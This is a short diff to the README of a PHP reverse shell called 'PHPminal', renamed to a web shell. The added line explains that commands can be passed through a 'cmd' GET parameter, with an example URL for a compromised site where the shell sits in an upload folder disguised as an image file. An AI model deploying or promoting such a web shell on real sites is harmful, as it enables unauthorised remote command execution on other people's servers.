@@ -1,6 +1,8 @@
-# PHPminal 
+# PHPminal webshell
 
 PHP terminal-emulator styled reverse shell.
+
+Commands can be entered in the input field or you can set the GET-paremeter `cmd` to hand over a command (useful for scripting) - e.g.: `https://haked.site/profilepics/phpminal.jpg.php?cmd=whoami`
 
 ## File generation 
 
